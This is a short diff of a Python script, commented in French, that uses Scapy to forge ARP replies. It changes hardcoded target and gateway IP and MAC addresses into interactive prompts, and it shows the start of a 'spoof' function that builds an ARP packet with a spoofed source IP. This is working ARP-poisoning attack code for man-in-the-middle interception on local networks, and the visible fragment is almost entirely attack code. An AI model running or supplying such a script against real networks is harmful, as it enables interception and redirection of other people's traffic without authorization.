@@ -2,10 +2,10 @@ from scapy.all import ARP, send
 import time
 
 
-Ip_cible = "192.168.1.39"
-Mac_cible = "00:0c:29:f3:e6:91"
-Ip_passerelle ="192.168.1.1"
-Mac_passerelle= "cc:19:a8:47:c6:0f"
+Ip_cible = input("Veuillez entrer l'adresse IP de la cible : ")
+Mac_cible = input("Veuillez entrer l'adresse MAC de la cible : ")
+Ip_passerelle = input("Veuillez entrer l'adresse IP de la passerelle : ")
+Mac_passerelle= input("Veuillez entrer l'adresse MAC de la passerelle : ")
 
 def spoof(Ip_dst, Mac_dst,Ip_usurpé):
     packet=ARP(op=2, pdst=Ip_dst, hwdst= Mac_dst, psrc= Ip_usurpé)
